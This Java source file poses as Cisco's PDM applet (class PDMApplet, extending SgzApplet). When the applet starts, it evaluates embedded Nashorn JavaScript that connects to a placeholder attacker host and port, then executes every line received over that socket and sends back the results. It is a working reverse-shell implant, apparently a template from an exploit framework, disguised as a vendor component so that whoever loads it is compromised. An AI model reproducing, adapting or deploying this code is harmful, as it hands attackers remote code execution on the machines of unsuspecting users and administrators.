
package com.cisco.pdm;

import com.cisco.nm.dice.loader.SgzApplet;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import jdk.nashorn.api.scripting.ClassFilter;
import jdk.nashorn.api.scripting.NashornScriptEngineFactory;

public final class PDMApplet extends SgzApplet {

  private static PDMApplet b;
  
  public void init() {
  }
  
  public void start(String[] paramArrayOfString) {
    String sunshine_js =
    "var sock = new java.net.Socket(\"!!!LHOST!!!\", !!!LPORT!!!);" +
    "if (sock.isConnected())" +
    "{" +
        "var input = new java.io.BufferedReader(new java.io.InputStreamReader(sock.getInputStream()));" +
        "var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream()));" +
        "var engine = new javax.script.ScriptEngineManager().getEngineByName(\"Nashorn\");" +
        "while (sock.isConnected()) {" +
            "var payload = input.readLine();" +
            "engine.compile(payload).eval();"  +
            "output.write(engine.invokeFunction(\"exec\"));" +
            "output.flush();" +
        "}" +
    "}";

    ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
    try
    {
        engine.eval(sunshine_js);
    }
    catch (Exception e)
    {
    }
  }
}
